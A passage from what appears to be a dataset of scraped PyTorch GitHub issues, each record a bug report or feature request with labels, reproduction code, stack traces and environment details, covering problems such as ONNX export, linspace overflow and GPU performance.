frame #6: <unknown function> + 0x2b6b21b (0x7f996695821b in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cpu.so)
frame #7: at::cudnn_batch_norm_backward(at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, double, at::Tensor const&) + 0x1ef (0x7f9964cff10f in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cpu.so)
frame #8: torch::autograd::generated::CudnnBatchNormBackward::apply(std::vector<at::Tensor, std::allocator<at::Tensor> >&&) + 0x42c (0x7f99668a9fec in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cpu.so)
frame #9: <unknown function> + 0x30d1017 (0x7f9966ebe017 in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cpu.so)
frame #10: torch::autograd::Engine::evaluate_function(std::shared_ptr<torch::autograd::GraphTask>&, torch::autograd::Node*, torch::autograd::InputBuffer&, std::shared_ptr<torch::autograd::ReadyQueue> const&) + 0x1400 (0x7f9966eb9860 in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cpu.so)
frame #11: torch::autograd::Engine::thread_main(std::shared_ptr<torch::autograd::GraphTask> const&) + 0x451 (0x7f9966eba401 in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cpu.so)
frame #12: torch::autograd::Engine::thread_init(int, std::shared_ptr<torch::autograd::ReadyQueue> const&, bool) + 0x89 (0x7f9966eb2579 in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cpu.so)
frame #13: torch::autograd::python::PythonEngine::thread_init(int, std::shared_ptr<torch::autograd::ReadyQueue> const&, bool) + 0x4a (0x7f996b1e199a in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_python.so)
frame #14: <unknown function> + 0xc819d (0x7f99aa6fa19d in /opt/conda/bin/../lib/libstdc++.so.6)
frame #15: <unknown function> + 0x76db (0x7f99adb356db in /lib/x86_64-linux-gnu/libpthread.so.0)
frame #16: clone + 0x3f (0x7f99ad85e88f in /lib/x86_64-linux-gnu/libc.so.6)
## To Reproduce

Steps to reproduce the behavior:

1. I used custom lambda layer before batch 
1.
1.

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

<!-- A clear and concise description of what you expected to happen. -->

## Environment
In ubuntu, CUDA 10.1, python 3.7
Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```
wget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py
# For security purposes, please check the contents of collect_env.py before running it.
python collect_env.py
```

 - PyTorch Version (e.g., 1.0):
 - OS (e.g., Linux):
 - How you installed PyTorch (`conda`, `pip`, source):
 - Build command you used (if compiling from source):
 - Python version:
 - CUDA/cuDNN version:
 - GPU models and configuration:
 - Any other relevant information:

## Additional context

<!-- Add any other context about the problem here. -->


cc @ngimel @csarofeen @ptrblck @xwang233",True
Cannot Import SWA Utils module: optimizer triaged,"## üêõ Bug

Unable to import `swa_utils`.

PyTorch: - Version 1.6
OS: - Windows and Linux
Tested on CUDA as well as CPU only installation

This import failed on all.

### To reproduce

Simply run

```
swa_scheduler = torch.optim.swa_utils.SWALR(
                optimizer, anneal_strategy=""linear"", anneal_epochs=20, swa_lr=0.05
            )
           AttributeError: module 'torch.optim' has no attribute 'swa_utils'
AttributeError: module 'torch.optim' has no attribute 'swa_utils'
```

### Possible Fix

The problem may be in the init file [here](https://github.com/pytorch/pytorch/blob/master/torch/optim/__init__.py)
`swa_utils` is not imported. 

Adding line from `.swa_utils import AveragedModel, SWALR` will allow it to import 

### Current Alternatives

I am able to do 
```
from torch.optim.swa_utils import SWALR
```

Then I can use SWALR properly.

It would nice If I could use the swa_utils itself to import SWALR. I'm Not sure if this is a bug or this is the way it was designed.

This feature works now. But it would be nice if it would be in `optim` or I can import `swa_utils` as well.


cc @vincentqb",True
Undefined reference to fbgemm. high priority module: build triaged,"## üêõ Bug

This is a build regression within last few days.
We got undefined reference `void fbgemm::CodeGenBase<unsigned char, signed char, int, int>::storeCRegs<asmjit::x86::Zmm, 64>(asmjit::x86::Emitter*, int, int, asmjit::x86::Gp, asmjit::x86::Gp, bool)`

<img width=""1064"" alt=""image"" src=""https://user-images.githubusercontent.com/5203025/89109182-7a82b200-d471-11ea-90e8-66d0adb25120.png"">

Since there's an fbgemm update 2 days ago, that could be the reason.
https://github.com/pytorch/pytorch/pull/42302

## Environment

 - PyTorch Version (e.g., 1.0): master
 - OS (e.g., Linux): Ubuntu 18.04
 - How you installed PyTorch (`conda`, `pip`, source): source
 - Build command you used (if compiling from source): cmake+ninja+gcc-8
 - CUDA/cuDNN version: 11/8


cc @ezyang @gchanan @zou3519 @malfet",True
Upgrading to 1.6 produces pylint `abstract-method` warning for custom modules module: typing triaged,"## üêõ Bug

The following trick for mypy

https://github.com/pytorch/pytorch/blob/269ec767cabe9c47baab18e58fad5d6485d4e65d/torch/nn/modules/module.py#L223-L239

introduced with 1.6 leads to pylint warnings

```
W0223: Method '_forward_unimplemented' is abstract in class 'Module' but is not overridden (abstract-method)
```

when extending `nn.Module` for custom modules.

## To Reproduce

Steps to reproduce the behavior:

1. Create MWE
```python
from torch import nn

class MyModule(nn.Module):
    def forward(self, x):
        return x
```
2. run pylint
```console
$ pylint --disable=all --enable=abstract-method mwe.py
mwe.py:4:0: W0223: Method '_forward_unimplemented' is abstract in class 'Module' but is not overridden (abstract-method)

```

## Expected behavior

No warnings if `forward` is implemented.

## Environment

```
Collecting environment information...
PyTorch version: 1.6.0
Is debug build: No
CUDA used to build PyTorch: 10.2

OS: Ubuntu 20.04.1 LTS
GCC version: (Ubuntu 9.3.0-10ubuntu2) 9.3.0
CMake version: Could not collect

Python version: 3.8
Is CUDA available: No
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA

Versions of relevant libraries:
[pip3] numpy==1.19.1
[pip3] torch==1.6.0
[conda] Could not collect
```

## Additional context

* I am using pytorch in project with many custom modules where the CI runs pylint. Since upgrading to torch 1.6 I therefore get a large number of warning. Since pylint is quite widespread, I suppose this problem may occur for other users as well.
* I am unsure whether the ""bug"" type of issue is correct. However, it seemed to be the best fit.

cc @ezyang @malfet @rgommers",True
bug in conversion torch model to onnx model  module: onnx triaged,"## üêõ Bug
I'm converting a pytorch model to onnx model. in this model there assignment of tensor to a slice of another tensor.
when i'm running the converted model with onnxruntime he crashes when trying to assign the small tensor to the big tensor and ignoring the slice operation.


## To Reproduce
i created a stand alone model to reproduce the problem. this is the error when trying to run the model:

**The input tensor cannot be reshaped to the requested shape. Input shape:{22,256}, requested shape:{56,1,256}**

Steps to reproduce the behavior:
run the attached code

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

``import torch
import onnx
import onnxruntime

class Test(torch.nn.Module):
    def __init__(self):
        super().__init__()

    def forward(self, x: torch.Tensor, y: torch.Tensor) -> torch.Tensor:
        x[:y.size(0), 0, :] = y
        return x

x = torch.zeros((56,6,256))
y = torch.rand((22,256))

m = Test()
torch_outputs = m(x, y)

path = ""/tmp/m.onnx""
torch.onnx.export(m, (x, y), path,
                    do_constant_folding=True,
                    opset_version=12,
                    input_names=[""x"", ""y""],
                    output_names=[""z""])

onnx_model = onnx.load_model(path)
onnx.checker.check_model(onnx_model)
inferred_model = onnx.shape_inference.infer_shapes(onnx_model)
onnx.save(inferred_model, path)

ort_model = onnxruntime.InferenceSession(path)

ort_outputs = ort_model.run([""z""], {""x"": x.numpy(), ""y"": y.numpy()})``

## Expected behavior
run successfully the model with onnxruntime

## Environment


 - PyTorch Version: 1.5.1 
 - OS (e.g., Linux): Linux ubuntu 16.04
 - How you installed PyTorch (`conda`, `pip`, source): pip
 - Build command you used (if compiling from source):
 - Python version: 3.6.8
 - GPU models and configuration:
 - Any other relevant information: onnxruntime verion 1.4.0


cc @houseroad @spandantiwari @lara-hdr @BowenBao @neginraoof",True
torch.inverse() performing very poorly on GPU vs CPU module: performance module: cuda triaged module: linear algebra,"## üêõ Bug
We observed a big increase in inference latency after adding `torch.inverse()` in the code path. After investigation and comparison with moving the op to CPU we found that there is a huge difference in performance of that op on GPU vs CPU.
The matrix size in our case is 4x4 which small for the GPU but `torch.inverse()` should be using `magma` library which has heuristics to move the op to CPU. We didn't see any magma invocations as well.

Based on @ptrblck suggestion we tried `inverse` on batched matrix to see if that made any difference but that also didn't result in any improvement.

**Performance Difference:**
```
‚ï∞‚îÄ python torch_inverse_exp.py
GPU Time: 8.78560 ms
CPU Time: 0.07149 ms
cpu/gpu: 122.90x
```
We increased the matrix dimensions to 1024x1024 but even then GPU is slower than CPU:
```
‚ï∞‚îÄ python torch_inverse_exp.py
GPU Time: 17.25289 ms
CPU Time: 9.54982 ms
cpu/gpu: 1.81x
```
## To Reproduce
Here is the snippet of code which can be run to reproduce the performance difference:
```
import torch
import time

a = torch.randn(4,4).cuda()
torch.cuda.synchronize()

num_iter = 100
def test1():
    s = time.time()
    for i in range(num_iter):
        x = torch.inverse(a)
    torch.cuda.synchronize()
    e = time.time()
    gpu_time = ((e - s)/num_iter)
    return  gpu_time

def test2():
    s = time.time()
    for i in range(num_iter):
        b = a.to('cpu')
        d = torch.inverse(b)
        y = d.to('cuda')
    torch.cuda.synchronize()
    e = time.time()
    cpu_time = ((e - s)/num_iter)
    return  cpu_time

gpu_time = test1()
print(""GPU Time: {:.5f} ms"".format(gpu_time*1000))

cpu_time = test2()
print(""CPU Time: {:.5f} ms"".format( cpu_time*1000))

print(""cpu/gpu: {:.2f}x "".format(gpu_time/cpu_time))
```
**Run:** `python <script_name>`

## Environment

Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```
wget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py
# For security purposes, please check the contents of collect_env.py before running it.
python collect_env.py

Collecting environment information...
PyTorch version: 1.5.1 (pip package)
Is debug build: No
CUDA used to build PyTorch: 10.1 & 10.2 (NGC 20.03 container)

OS: Ubuntu 18.04.4 LTS
GCC version: (Ubuntu 8.4.0-1ubuntu1~18.04) 8.4.0
CMake version: version 3.17.3

Python version: 3.7
Is CUDA available: Yes
CUDA runtime version: 10.1.243
GPU models and configuration:
GPU 0: TITAN RTX
GPU 1: TITAN RTX

Nvidia driver version: 440.100
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5

Versions of relevant libraries:
[pip3] numpy==1.18.5
[pip3] numpydoc==1.1.0
[pip3] torch==1.5.1
[pip3] torchvision==0.6.0a0+35d732a
[pip3] torchviz==0.0.1
[conda] _pytorch_select           0.2                       gpu_0
[conda] blas                      1.0                         mkl
[conda] cudatoolkit               10.1.243             h6bb024c_0
[conda] mkl                       2020.1                      217
[conda] mkl-service               2.3.0            py37he904b0f_0
[conda] mkl_fft                   1.1.0            py37h23d657b_0
[conda] mkl_random                1.1.1            py37h0573a6f_0
[conda] numpy                     1.18.5           py37ha1c710e_0
[conda] numpy-base                1.18.5           py37hde5b4d6_0
[conda] numpydoc                  1.1.0                      py_0
[conda] pytorch                   1.5.1           py3.7_cuda10.1.243_cudnn7.6.3_0    pytorch
[conda] torchvision               0.6.1                py37_cu101    pytorch
[conda] torchviz                  0.0.1                    pypi_0    pypi
```

@ptrblck @ngimel for visibility

cc @ngimel @vincentqb @vishwakftw @SsnL @jianyuh @VitalyFedyunin",True
Accessing state_dict() of models trained with previous pytorch version high priority triage review module: nn triaged,"## üêõ Bug

Since updating to version 1.6, when trying to access `model.state_dict()` of a older pytorch trained models (where model is a subclass of torch.nn.module), I'm getting a `ModuleAttributeError`.

## To Reproduce

Steps to reproduce the behavior:

```
torch.load(""path/to/model"", map_location='cpu')
print(model.state_dict())
```
where the model was trained with an older version of pytorch.

The output is
```
  File ""/home/oliviermt/miniconda3/envs/projections/lib/python3.7/site-packages/torch/nn/modules/module.py"", line 900, in state_dict
    module.state_dict(destination, prefix + name + '.', keep_vars=keep_vars)
  File ""/home/oliviermt/miniconda3/envs/projections/lib/python3.7/site-packages/torch/nn/modules/module.py"", line 900, in state_dict
    module.state_dict(destination, prefix + name + '.', keep_vars=keep_vars)
  File ""/home/oliviermt/miniconda3/envs/projections/lib/python3.7/site-packages/torch/nn/modules/module.py"", line 897, in state_dict
    self._save_to_state_dict(destination, prefix, keep_vars)
  File ""/home/oliviermt/miniconda3/envs/projections/lib/python3.7/site-packages/torch/nn/modules/module.py"", line 860, in _save_to_state_dict
    if buf is not None and name not in self._non_persistent_buffers_set:
  File ""/home/oliviermt/miniconda3/envs/projections/lib/python3.7/site-packages/torch/nn/modules/module.py"", line 772, in __getattr__
    type(self).__name__, name))
torch.nn.modules.module.ModuleAttributeError: 'GaussianSmearing' object has no attribute '_non_persistent_buffers_set'
```

I was able to make it work by adding the following lines after the the `torch.load`:
```
for mod in model.modules():
     if not hasattr(mod, ""_non_persistent_buffers_set""):
            mod._non_persistent_buffers_set = set()
```
If it's expected behaviour, then ignore this issue, but I would guess it's not.
Thanks a lot!

## Expected behavior

Not needing to add those 3 lines.

## Environment

PyTorch version: 1.6.0
Is debug build: No
CUDA used to build PyTorch: 10.2

OS: Ubuntu 16.04.6 LTS
GCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609
CMake version: version 3.5.1

Python version: 3.7
Is CUDA available: No
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA

Versions of relevant libraries:
[pip3] numpy==1.19.1
[pip3] torch==1.6.0
[pip3] torchvision==0.7.0
[conda] numpy                     1.19.1                   pypi_0    pypi
[conda] torch                     1.6.0                    pypi_0    pypi
[conda] torchvision               0.7.0                    pypi_0    pypi

## Additional context

<!-- Add any other context about the problem here. -->


cc @ezyang @gchanan @zou3519 @albanD @mruberry",True
`torch.hub.load_state_dict_from_url()` is not able to load the new zipfile serialization files high priority triaged module: hub,"## üêõ Bug

If you call `torch.hub.load_state_dict_from_url()` on a file saved in the new zipfile serialization format, it raises `RuntimeError('Only one file(not dir) is allowed in the zipfile')`.

## To Reproduce

Steps to reproduce the behavior:

1. Upload a state dictionary file saved using the vanilla `torch.save()` to a server.
1. Call `torch.hub.load_state_dict_from_url()` to that url.
1. You'll see the `RuntimeError` raised.

We discovered this as part of the effort to support pytorch 1.6 with pytorch lightning. Here's one of the failed test runs: https://github.com/PyTorchLightning/pytorch-lightning/runs/920684391

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

`torch.hub.load_state_dict_from_url()` should load the new zipfile serialization files without any errors.

## Environment

```
Collecting environment information...
PyTorch version: 1.6.0
Is debug build: No
CUDA used to build PyTorch: None

OS: Mac OSX 10.14.6
GCC version: Could not collect
CMake version: Could not collect

Python version: 3.7
Is CUDA available: No
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA

Versions of relevant libraries:
[pip3] numpy==1.19.1
[pip3] pytorch-lightning==0.9.0rc3
[pip3] torch==1.6.0
[pip3] torchtext==0.6.0
[pip3] torchvision==0.7.0
[conda] Could not collect
```

## Additional context

We use `torch.hub.load_state_dict_from_url()` to load remote PyTorch Lightning checkpoints.

CC @williamFalcon @borda


cc @ezyang @gchanan @zou3519 @ailzhang",True
Type mismatch error with torch.nn.functional.grid_sample() under AMP triaged module: amp (automated mixed precision),"## üêõ Bug

Found training a model with `grid_sample(input, grid)` throws the following error under AMP:
```
RuntimeError: grid_sampler(): expected input and grid to have same dtype, but input has c10::Half and grid has float
``` 
- This also happens in a form `(input, grid) = (float, c10:Half)`, depending on the model definition.
- I'm not sure, however, how could I reproduce this error in a minimal code snippet.
- Casting both `(input, grid) -> (input.float(), grid.float())` could bypass this issue.

## To Reproduce

Steps to reproduce the behavior:

1. Construct a complex model including `grid_sample()`
1. Run it under `with autocast()`:

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

<!-- A clear and concise description of what you expected to happen. -->

AMP is expected to handle every native functions properly in an autocast-enabled region.

## Environment

```
Collecting environment information...
PyTorch version: 1.6.0
Is debug build: No
CUDA used to build PyTorch: 10.1

OS: Ubuntu 16.04.4 LTS
GCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609
CMake version: version 3.5.1

Python version: 3.8
Is CUDA available: Yes
CUDA runtime version: 10.1.243
GPU models and configuration:
GPU 0: TITAN Xp
GPU 1: TITAN Xp
GPU 2: TITAN Xp
GPU 3: TITAN Xp

Nvidia driver version: 418.87.00
cuDNN version: Probably one of the following:
/usr/lib/x86_64-linux-gnu/libcudnn.so.7.1.2
/usr/local/cuda-10.1/targets/x86_64-linux/lib/libcudnn.so.7.6.4
/usr/local/cuda-8.0/targets/x86_64-linux/lib/libcudnn.so.6
/usr/local/cuda-8.0/targets/x86_64-linux/lib/libcudnn.so.7

Versions of relevant libraries:
[pip] numpy==1.18.1
[pip] torch==1.6.0
[pip] torchlars==0.1.2
[pip] torchvision==0.7.0
[conda] blas                      1.0                         mkl
[conda] cudatoolkit               10.1.243             h6bb024c_0
[conda] mkl                       2020.1                      217
[conda] mkl-service               2.3.0            py38he904b0f_0
[conda] mkl_fft                   1.0.15           py38ha843d7b_0
[conda] mkl_random                1.1.0            py38h962f231_0
[conda] numpy                     1.18.1           py38h4f9e942_0
[conda] numpy-base                1.18.1           py38hde5b4d6_1
[conda] pytorch                   1.6.0           py3.8_cuda10.1.243_cudnn7.6.3_0    pytorch
[conda] torchlars                 0.1.2                    pypi_0    pypi
[conda] torchvision               0.7.0                py38_cu101    pytorch
```



cc @mcarilli",True
Poor performance of dynamic quantazation high priority triage review module: performance oncall: jit module: internals oncall: quantization triaged days,"## üêõ Bug

I am experimenting with dynamic quantization as described here:
https://pytorch.org/blog/introduction-to-quantization-on-pytorch/

I got a pretty good speedup when running with a single thread. (This is a GRPC server application that serves pytorch models). However, I do not see any improvement when using multiple threads and processing multiple concurrent requests. This does not happen when dynamic quantization is not being used: I see pretty good scaling up to about 10 threads. The CPU utilization when running with 10 threads but without quantization is well over 700%. However, when dynamic quantization is enabled, CPU load peaks around 150%, meaning that most of the cores sit idle.

This leads me to believe that python's GIL is the culprit. I noticed that in many parts of the code, pytorch does the following:

pybind11::gil_scoped_release no_gil;

But this does not happen in qlinear_dynamic.cpp which runs on dynamic quantization. This again implies that when dynamic quantization is used, GIL does not get released. This would certainly explain why we see improved performance with one thread but not with multiple threads.

## To Reproduce

Steps to reproduce the behavior:

1. Set OMP_NUM_THREADS=1 environment variable.

2. Load any model and apply dynamic quantization:

model = torch.quantization.quantize_dynamic(model, {torch.nn.Linear}, dtype=torch.qint8)

3. Use threadpool to make multiple concurrent calls to to the model.

## Expected behavior

Throughput should scale with the number of threads in the threadpool.

## Environment

Collecting environment information...
PyTorch version: 1.5.1
Is debug build: No
CUDA used to build PyTorch: None

OS: Mac OSX 10.15.5
GCC version: Could not collect
CMake version: version 3.15.0

Python version: 3.8
Is CUDA available: No
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA

Versions of relevant libraries:
[pip3] msgpack-numpy==0.4.1
[pip3] numpy==1.18.4
[pip3] pytorch-pretrained-bert==0.6.2
[pip3] torch==1.5.1
[pip3] torchvision==0.6.1
[conda] Could not collect

## Additional context

If you remove the dynamic quantization line, single-thread performance is slower but throughput does scale properly with the number of threads in the threadpool.


cc @ezyang @gchanan @zou3519 @suo @gmagogsfm @bhosmer @smessmer @ljk53 @jerryzh168 @jianyuh @dzhulgakov @raghuramank100 @jamesr66a @vkuzo @VitalyFedyunin @ngimel",True
"Improve error reporting in ""Check for no AVX instruction by default"" module: bootcamp triaged enhancement better-engineering","When AVX/AVX2 instruction is encountered while running `basic` unit test, qemu segfaults, which does give developer a good idea why the test have failed.
This could be improved by re-running `qemu` with gdbserver and printing a backtrace + instruction that caused the failure. This can be done by modifying
https://github.com/pytorch/pytorch/blob/a80dd02a224ea0f2c9582f428bc12d4579deaa92/.circleci/verbatim-sources/job-specs/pytorch-job-specs.yml#L135 
To something along the following lines:
```
$ qemu-x86_64 -g 2345 -cpu Broadwell -E ATEN_CPU_CAPABILITY=default ./basic --gtest_filter=BasicTest.BasicTestCPU &
$ gdb ./basic -ex ""target remote :2345"" -ex ""continue"" -ex ""bt""
```

How to test that the change:
Add global AVX variable to any .cpp file, for example:
```
const __m256i foobar = _mm256_set_epi32(0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08);
```

",True
linspace returns wrong result for int32 module: numerical-stability triaged enhancement,"## üêõ Bug

`linspace` with `int32` dtype returns wrong results when input values are big. This happens on nightly build (`macOS`) and source build (`ubuntu`).

## To Reproduce

```
$ python -c 'import torch;print(torch.linspace(-2147483647, 2147483647, 10, dtype=torch.int32))'
tensor([-2147483647, -2147483647, -2147483647, -2147483647, -2147483647,
         2147483647,  2147483647,  2147483647,  2147483647,  2147483647],
       dtype=torch.int32)
```

```
$ python -c 'import torch;print(torch.linspace(-2000000000, 2147483647, 10, dtype=torch.int32))'
tensor([-2000000000, -2016387072, -2032774144, -2049161216, -2065548288,
        -2147483648, -2147483648, -2147483648, -2147483648,  2147483647],
       dtype=torch.int32)
```

```
$ python -c 'import torch;print(torch.linspace(-1000000000, 2147483647, 10, dtype=torch.int32))'
tensor([-1000000000, -1127498183, -1254996366, -1382494549, -1509992732,
        -2147483648, -2147483648, -2147483648, -2147483648,  2147483647],
       dtype=torch.int32)
```

## Expected behavior

linear interpolation is correct

## Environment

<details><summary><code>Mac</code></summary>

```
Collecting environment information...
PyTorch version: 1.6.0.dev20200616
Is debug build: No
CUDA used to build PyTorch: None

OS: Mac OSX 10.15.5
GCC version: Could not collect
CMake version: Could not collect

Python version: 3.7
Is CUDA available: No
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA

Versions of relevant libraries:
[pip] numpy==1.18.1
[pip] torch==1.6.0.dev20200616
[conda] blas                      1.0                         mkl
[conda] mkl                       2019.4                      233
[conda] mkl-service               2.3.0            py37hfbe908c_0
[conda] mkl_fft                   1.0.15           py37h5e564d8_0
[conda] mkl_random                1.1.0            py37ha771720_0
[conda] numpy                     1.18.1           py37h7241aed_0
[conda] numpy-base                1.18.1           py37h6575580_1
[conda] pytorch                   1.6.0.dev20200616         py3.7_0    pytorch-nightly
```
</details>

<details><summary><code>Ubuntu</code></summary>

```
Collecting environment information...
PyTorch version: 1.6.0a0+ec1833b
Is debug build: No
CUDA used to build PyTorch: 10.1

OS: Ubuntu 18.04.3 LTS
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
CMake version: version 3.10.2

Python version: 3.8
Is CUDA available: Yes
CUDA runtime version: 10.1.243
GPU models and configuration:
GPU 0: Quadro GP100
GPU 1: Quadro GP100

Nvidia driver version: 418.116.00
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5

Versions of relevant libraries:
[pip] numpy==1.18.1
[pip] torch==1.6.0a0+ec1833b
[pip] torchaudio==0.6.0a0+2fa6cc7
[pip] torchtext==0.6.0a0+e823aca
[pip] torchvision==0.7.0a0+f9ef235
[conda] magma-cuda101             2.5.2                         1    pytorch
[conda] mkl                       2020.1                      217
[conda] mkl-include               2020.1                      217    conda-forge
[conda] numpy                     1.18.1           py38h8854b6b_1    conda-forge
[conda] torch                     1.6.0a0+ec1833b           dev_0    <develop>
[conda] torchaudio                0.6.0a0+2fa6cc7           dev_0    <develop>
[conda] torchtext                 0.6.0a0+e823aca           dev_0    <develop>
[conda] torchvision               0.7.0a0+f9ef235           dev_0    <develop>
```
</details>
",True
[docs] Urls changed => forum links would become invalid high priority module: docs triaged module: doc infra,"Originally in https://github.com/pytorch/pytorch/issues/18095#issuecomment-633149307:

@vadimkantorov:
Works: https://pytorch.org/docs/stable/torch.html#torch.flip
Breaks: https://pytorch.org/docs/master/torch.html#torch.flip

@t-vi:
They're now separate pages: https://pytorch.org/docs/master/generated/torch.flip.html#torch.flip
...but it would break many links, including on the forums.

@ezyang:
Yes, this will be a release blocker for next release.

cc @ezyang @gchanan @zou3519 @mattip",True
Different speed between BatchNorm1d and BatchNorm2d high priority module: dependency bug module: performance module: cudnn module: nn module: cuda triaged,"Hi I assume BatchNorm1d and BatchNorm2d (or 3d) should have same performance. However when normalizing a tensor of shape `(L, C) = (B*H*W, C)` by BatchNorm1d, the speed is >5x slower than BatchNorm2d on a shape of `(B, C, H, W)`. Is this expected or is there a way to speed up?

Reproducer:

```
import torch

def time_bn(bn, x):
    start = torch.cuda.Event(enable_timing=True)
    end = torch.cuda.Event(enable_timing=True)
    start.record()
    x = bn(x)
    end.record()
    torch.cuda.synchronize()
    print(start.elapsed_time(end))
    return x

shape = (50, 50, 50, 50)
a = torch.rand(shape)
b = a.flatten(0, -2)

bna = torch.nn.BatchNorm2d(50)
bnb = torch.nn.BatchNorm1d(50)

time_bn(bna, a)
time_bn(bnb, b)
```

Output:
```
11.409407615661621
89.55596923828125
```

## Environment

```
 - PyTorch Version: tested on 1.4/1.5
 - OS: Ubuntu 18.04
 - How you installed PyTorch (`conda`, `pip`, source): conda
 - Python version: 3.7/3.8
 - CUDA/cuDNN version: 10.1
 - GPU models and configuration: GTX 1070
 - Any other relevant information:
```

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @ngimel @csarofeen @ptrblck @xwang233 @albanD @mruberry @VitalyFedyunin",True
Typing Error in torch.utils.data.DataLoader and Dataset high priority module: typing triaged,"## üêõ Bug

In [dataloader.py#60](https://github.com/pytorch/pytorch/blob/d035d05080729c30636ff30fcc068de3c7e9badd/torch/utils/data/dataloader.py#L60), `DataLoader` does not inherit `typing.Generic`, but in [dataloader.pyi#15](https://github.com/pytorch/pytorch/blob/d035d05080729c30636ff30fcc068de3c7e9badd/torch/utils/data/dataloader.pyi#L15) type inferace of `DataLoader` inherits `typing.Generic`.

`Dataset` is also in same situation. See also [dataset.py#L8](https://github.com/pytorch/pytorch/blob/d035d05080729c30636ff30fcc068de3c7e9badd/torch/utils/data/dataset.py#L8), [dataset.pyi#L6](https://github.com/pytorch/pytorch/blob/d035d05080729c30636ff30fcc068de3c7e9badd/torch/utils/data/dataset.pyi#L6).

## To Reproduce

```python
>>> import torch
>>> from typing import List
>>> from torch.utils.data import Dataset, DataLoader
>>> class SomeDatasetClass(Dataset[List[torch.Tensor]]):
...     ...
... 
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
TypeError: 'type' object is not subscriptable
```

```python
>>> import torch
>>> from typing import List
>>> from torch.utils.data import Dataset, DataLoader
>>> class SomeDatasetClass(Dataset):
...     ...
... 
>>> def _create_dataloader(is_train: bool) -> DataLoader[List[torch.Tensor]]:
...     ...
... 
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
TypeError: 'type' object is not subscriptable
```

## Expected behavior

`DataLoader` and `Dataset` should inherit `typing.Generic`, so above code should run without any exceptions.

```python
>>> from typing import Generic, TypeVar
>>> T = TypeVar('T')
>>> class SomeGenericClass(Generic[T]):
...     ...
... 
>>> def create_some_generic_class() -> SomeGenericClass[bool]:
...     ...
...
>>>
```

Like above code snippet.

## Environment

 - PyTorch Version (e.g., 1.0): 1.5.0
 - Python version: Python 3.7.5

## Additional context

I think this issue is related to #31765


cc @ezyang @gchanan @zou3519",True
Normal.icdf is differs on different cuda devices high priority module: cuda triaged module: correctness (silent),"## üêõ Bug

Normal.icdf is different on different cuda devices

Steps to reproduce the behavior:

[normal_cdf_bug.ipynb.txt](https://github.com/pytorch/pytorch/files/4664656/normal_cdf_bug.ipynb.txt)
<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

```
import torch
x = torch.rand(10, dtype=torch.double)
normal = torch.distributions.Normal(0,1)
normal.icdf(x)
```
Output: 
>>> tensor([-0.0274,  0.9183,  0.8124,  0.1397, -0.1859,  0.0392, -0.3418,  0.8999,
         2.2092, -0.5433], dtype=torch.float64)

```
normal = torch.distributions.Normal(0,1)
normal.icdf(x.cuda())
```
Output:
>>> tensor([-0.0274,  0.9183,  0.8124,  0.1397, -0.1859,  0.0392, -0.3418,  0.8999,
     2.2092, -0.5433], dtype=torch.float64)
```
normal = torch.distributions.Normal(0,1)
normal.icdf(x.cuda(1))
```
Output:
>>> tensor([-0.0219,  0.6415,  0.5835,  0.1111, -0.1475,  0.0313, -0.2675,  0.6318,
         0.9728, -0.4131], device='cuda:1', dtype=torch.float64)
## Expected behavior

I expected Normal.icdf to be the same on all devices.

## Environment
Collecting environment information...
PyTorch version: 1.6.0a0-fb
Is debug build: No
CUDA used to build PyTorch: 9.2.88

OS: CentOS Linux 7 (Core)
GCC version: (GCC) 4.8.5 20150623 (Red Hat 4.8.5-39)
CMake version: Could not collect

Python version: 3.7
Is CUDA available: Yes
CUDA runtime version: Could not collect
GPU models and configuration: 
GPU 0: Tesla V100-SXM2-16GB
GPU 1: Tesla V100-SXM2-16GB
GPU 2: Tesla V100-SXM2-16GB
GPU 3: Tesla V100-SXM2-16GB
GPU 4: Tesla V100-SXM2-16GB
GPU 5: Tesla V100-SXM2-16GB
GPU 6: Tesla V100-SXM2-16GB
GPU 7: Tesla V100-SXM2-16GB

Nvidia driver version: 396.69
cuDNN version: Could not collect

Versions of relevant libraries:
[pip] Could not collect
[conda] Could not collect

cc @ezyang @gchanan @zou3519 @ngimel",True
max_pool1d creates illegal memory access for large kernel sizes module: nn module: cuda triaged,"## üêõ Bug

